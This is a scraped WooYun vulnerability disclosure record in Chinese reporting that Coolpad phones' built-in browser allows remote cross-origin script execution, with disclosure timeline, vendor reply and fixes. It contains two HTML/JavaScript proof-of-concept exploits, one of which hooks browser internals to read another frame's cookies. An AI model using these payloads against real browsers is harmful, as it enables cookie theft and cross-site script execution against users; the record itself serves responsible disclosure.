{"id": 84372, "wybug_id": "wooyun-2015-0145018", "wybug_title": "酷派内置酷派浏览器可远程跨域执行脚本", "wybug_corp": "yulong.com", "wybug_author": "路人甲", "wybug_date": "2015-10-08 14:50", "wybug_open_date": "2016-01-11 15:32", "wybug_type": "远程代码执行", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["远程代码执行"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-08：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-10-12：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-10-15：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航）\t\t\t\t\t\t\t\t\t2015-12-06：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-12-16：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-12-26：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-01-11：\t细节向公众公开  简要描述： 酷派内置酷派浏览器可远程跨域执行脚本 详细说明：  酷派手机内置浏览器\n\n构造简单pocpoc1:\n<body><script>i = document.body.appendChild(document.createElement(\"iframe\"));i.src = \"http://**.**.**.**\";i.onload = function(){\tdocument.documentURI = \"javascript://**.**.**.**/%0D%0Aalert('OH HAI ' + location)\";\ti.contentWindow.location = \"\";}</script></body>\npoc2:\n<body><script>frame = document.body.appendChild(document.createElement(\"iframe\"));frame.src = \"http://**.**.**.**/\";frame.onload = function() {\tFunction(\"}, (builtins = this), function() {\");\toriginalInstantiate = builtins.Instantiate;\tbuiltins.DefineOneShotAccessor(builtins, \"Instantiate\", function() {});\tflag = 0;\ttemplate = null;\tbuiltins.Instantiate = function(x, y) {\t\tif (flag) {\t\t\tdoc = frame.contentWindow.document;\t\t\talert(doc.cookie);\t\t\tflag = 0;\t\t} else if (!template)\t\t\ttemplate = x;\t\treturn originalInstantiate(x, y);\t};\tdocument.implementation;\tflag = 1;\tbuiltins.ConfigureTemplateInstance(frame.contentWindow, template);}</script></body>\n   漏洞证明：  poc1执行：\n\npoc2执行：\n\n   修复方案：  1.客户端对iframe object标签属性进行过滤2.禁止webview访问本地域   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2015-10-12 20:19 厂商回复： 感谢关注酷派安全，已转交研发部门，待测试确认后做详细细节答复。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}